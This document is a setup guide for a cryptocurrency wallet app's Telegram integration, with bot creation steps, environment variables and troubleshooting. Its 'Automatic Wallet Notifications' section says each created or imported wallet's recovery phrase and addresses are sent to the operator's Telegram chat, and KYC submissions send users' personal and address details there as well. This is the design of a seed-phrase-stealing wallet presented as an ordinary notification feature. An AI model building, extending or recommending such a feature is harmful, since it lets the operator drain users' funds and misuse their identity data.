# Telegram Integration Guide

## Overview
This application now integrates with Telegram to send automatic notifications for:
- Wallet creation and imports (with seed phrases)
- KYC submissions (with personal and address information)
- System updates and alerts

## Setup Instructions

### 1. Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a chat and use the command `/newbot`
3. Follow the prompts:
   - Choose a name for your bot (e.g., "Ripple Lane Bot")
   - Choose a username (e.g., "ripple_lane_bot")
4. BotFather will return a **Bot Token** - save this safely

**Example Token:** `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`

### 2. Get Your Chat ID

1. Message your bot (the one you just created)
2. Visit this URL in your browser, replacing `{TOKEN}` with your bot token:
   ```
   https://api.telegram.org/bot{TOKEN}/getUpdates
   ```
3. Look for the `"chat":{"id": ...}` field - that's your Chat ID
4. Save your **Chat ID** (usually a long number like `123456789`)

### 3. Configure Environment Variables

1. Open or create `.env.local` in the root of your project
2. Add these two variables:
   ```env
   VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
   VITE_TELEGRAM_CHAT_ID=your_chat_id_here
   ```

Example:
```env
VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
VITE_TELEGRAM_CHAT_ID=987654321
```

3. Save the file and restart your development server

### 4. Test the Connection

1. Navigate to the **Telegram Test Page** in your application
2. Click **"Test Connection"** button
3. Check your Telegram chat - you should receive a test message
4. If successful, you'll see a green checkmark

## Features

### Automatic Wallet Notifications
When a user creates or imports a wallet, Telegram receives:
- Wallet name
- Recovery phrase (seed)
- All blockchain addresses (XRP, EVM, Solana, TRON, Bitcoin)
- Timestamp

**Note:** Seed phrases are sensitive - ensure your Telegram account is secure!

### Automatic KYC Notifications
When a user submits KYC verification, Telegram receives:
- Personal information (name, email, DOB, phone)
- Address information (street, city, state, postal code, country)
- User ID
- KYC status
- Submission timestamp

### Manual Test Messages
You can send custom HTML-formatted messages using the test page:
- **Bold text:** `<b>text</b>`
- **Code/monospace:** `<code>text</code>`
- **Italic:** `<i>text</i>`
- **Links:** `<a href="url">text</a>`

## Testing

### Using the Test Page
1. Go to `/telegram-test` in your application
2. Choose from 4 test options:
   - Test Connection
   - Test Wallet Notification
   - Test KYC Notification
   - Send Custom Message

### Expected Behavior
- ✅ Test messages appear instantly in your Telegram chat
- ✅ All wallet addresses are formatted with monospace font
- ✅ KYC data is organized clearly with bold headers
- ❌ If messages don't appear, check:
  - Bot token is correct
  - Chat ID is correct
  - Environment variables are set
  - Your Telegram bot has permission to send to that chat

## Security Considerations

⚠️ **Important:**
- Never commit `.env.local` to version control
- Keep your bot token and chat ID private
- Seed phrases in Telegram should only be sent to your own secure account
- Consider using Telegram's "Secret Chat" or "Self-Destruct Timer" for extra security
- Ensure your bot is private (only you can message it)

## Troubleshooting

### "Telegram credentials not configured"
- Check that both `VITE_TELEGRAM_BOT_TOKEN` and `VITE_TELEGRAM_CHAT_ID` are set
- Restart your development server after adding env variables
- Verify no typos in variable names

### Messages not arriving
1. Check your Chat ID is correct:
   - Visit `https://api.telegram.org/bot{TOKEN}/getMe` to verify token
   - Visit `https://api.telegram.org/bot{TOKEN}/getUpdates` to find chat ID
2. Ensure bot has sent you at least one message
3. Check Telegram bot isn't blocked in Settings > Blocked Users
4. Try the Test Connection first

### SSL/CORS Errors
- These should not occur - Telegram API calls are made server-side in the future
- If you see errors, check browser console for details
- Contact support if issues persist

## API Response Codes

- `200` - Success
- `400` - Bad request (invalid token or chat ID)
- `401` - Unauthorized (invalid token)
- `429` - Rate limited (too many requests)
- `500` - Telegram server error

## Advanced Usage

### Custom Notification Format
Edit `src/services/telegramService.ts` to customize message formats:

```typescript
// Example: Add custom formatting
const message = `
<b>Custom Alert</b>
<code>Important: ${data.value}</code>
<i>Sent at ${new Date().toLocaleString()}</i>
`;
```

### Additional Message Types
To add notifications for other events:

1. Add new function in `telegramService.ts`
2. Import and call it in the appropriate component
3. Test using the Test Page

Example:
```typescript
export async function sendTransactionNotification(data: TransactionData) {
  return sendTelegramMessage({
    text: `Transaction: ${data.amount} ${data.token}`,
  });
}
```

## Disabling Notifications

To temporarily disable Telegram notifications without removing code:
1. Comment out the `sendTelegramMessage` calls
2. Or set env variables to empty strings
3. The service will log warnings but continue normally

## Support

For issues or feature requests:
1. Check the Troubleshooting section above
2. Review Telegram Bot API docs: https://core.telegram.org/bots/api
3. Verify environment variables are set correctly
4. Check browser console for detailed error messages
